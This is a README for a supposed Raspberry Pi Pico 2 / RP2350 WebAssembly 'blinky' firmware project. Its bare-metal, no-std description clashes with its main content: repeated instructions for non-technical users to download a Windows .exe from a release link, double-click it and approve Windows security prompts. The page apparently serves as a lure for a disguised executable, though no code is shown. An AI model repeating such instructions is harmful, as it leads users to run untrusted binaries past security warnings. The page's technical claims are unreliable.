# 🔹 embedded-wasm-blinky-rp2350 - Run WebAssembly on RP2350

[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/releases)

## 🧭 What this is

**embedded-wasm-blinky-rp2350** is a small Windows-friendly project for the Raspberry Pi Pico 2 and other RP2350-based boards. It runs a WebAssembly Component Model runtime on bare metal and uses the board’s hardware features through WIT interfaces.

In plain terms, this project lets the device blink an LED while running WebAssembly code on the board itself. It is built with embedded Rust, uses `wasmtime` with the `pulley` interpreter, and targets `no-std` systems.

## 💾 Download the app

Visit the release page to download and run the latest build:

[Go to releases](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/releases)

Look for the latest release and download the Windows file that matches it. If the release includes a `.zip` file, download it and extract it first. If it includes an `.exe` file, you can run it after download.

## 🪟 Windows setup

### 1. Download the release
Open the releases page and get the latest Windows build.

### 2. Extract the files
If the download comes as a `.zip` file:

- Right-click the file
- Choose **Extract All**
- Pick a folder you can find again, such as **Downloads** or **Desktop**

### 3. Run the program
If the release contains an `.exe` file:

- Double-click the file to start it

If the release contains a folder with files inside:

- Open the folder
- Double-click the main program file

### 4. Allow Windows to finish checks
Windows may take a moment to open the file the first time. If a prompt appears, choose the option that lets you run the app.

## 🔌 What you need

For a smooth run on Windows, use:

- Windows 10 or Windows 11
- A standard desktop or laptop
- Enough free space for the downloaded release files
- A USB cable if you plan to load the firmware onto a board

For the hardware side, this project is aimed at:

- Raspberry Pi Pico 2
- RP2350-based boards
- Boards with LED output and USB access

## 🧩 How it works

This project combines several parts:

- **Embedded Rust** for the core firmware
- **Bare-metal runtime** for direct hardware access
- **WebAssembly Component Model** for structured app logic
- **WIT interfaces** to expose board hardware
- **wasmtime** and **pulley** to run WebAssembly on the device

This setup keeps the system small and direct. The board controls the LED, and the runtime handles the WebAssembly side.

## ✨ What you can do with it

Use this project to:

- Blink an LED on an RP2350 board
- Run a WebAssembly runtime on embedded hardware
- Test Component Model code on a real device
- Explore embedded Rust with `no-std`
- Work with board features through clean interfaces

## 🛠️ Basic usage

After you download the release, use it in one of these ways:

- Run the Windows file if the release includes a desktop build
- Load the firmware onto a compatible RP2350 board if the release includes device files
- Connect the board by USB and watch the LED behavior
- Replace the sample app with your own WebAssembly component

If the release includes extra files such as firmware images or configuration files, keep them in the same folder as the main program.

## 📁 Typical release contents

A release for this project may include:

- A Windows executable or archive
- Firmware images for RP2350 boards
- Sample WebAssembly component files
- Support files for USB or board setup
- A short readme for the exact release build

## 🧪 Expected behavior

When the app runs, you should see:

- The board start up
- The LED blink
- The runtime load its embedded WebAssembly logic
- Hardware access happen through the board interface layer

If the board is connected and the firmware loads correctly, the blink pattern should appear within a short time after startup.

## 🔍 Troubleshooting

### The file does not open
Try these steps:

- Make sure the download finished
- Extract the archive if it came as a `.zip`
- Run the file from a normal folder like **Downloads**
- Right-click the file and choose **Open**

### Windows blocks the file
If Windows shows a security prompt:

- Choose the option that lets you run the file
- Confirm that you downloaded it from the releases page

### The board does not blink
Check the following:

- The board is connected by USB
- The correct release file is on the device
- The board has power
- The LED is wired or built into the board as expected

### The wrong file was downloaded
Go back to the release page and pick the file that matches your system or board.

## 🧰 Project details

This repository is built around:

- `embedded-rust`
- `embedded-wasm`
- `webassembly`
- `component-model`
- `wasmtime`
- `pulley`
- `rp2350`
- `pico2`
- `cortex-m33`
- `bare-metal`
- `no-std`

These topics point to a low-level embedded project that runs without a normal operating system on the target device.

## 📦 Release link

[Open the latest release](https://github.com/unrequited-indianapolis305/embedded-wasm-blinky-rp2350/releases)

## 🧭 File names to look for

Common release file names may include:

- `embedded-wasm-blinky-rp2350-windows.zip`
- `embedded-wasm-blinky-rp2350.exe`
- `firmware.bin`
- `flash.uf2`
- `release.zip`

If you see more than one file, use the one meant for Windows or the one marked for your RP2350 board

## 🖥️ Quick start for non-technical users

1. Open the release page  
2. Download the latest file for Windows  
3. Extract it if needed  
4. Double-click the main file  
5. Connect the board if the app asks for hardware access  
6. Watch the LED blink  
7. Keep the files in one folder if the app uses support files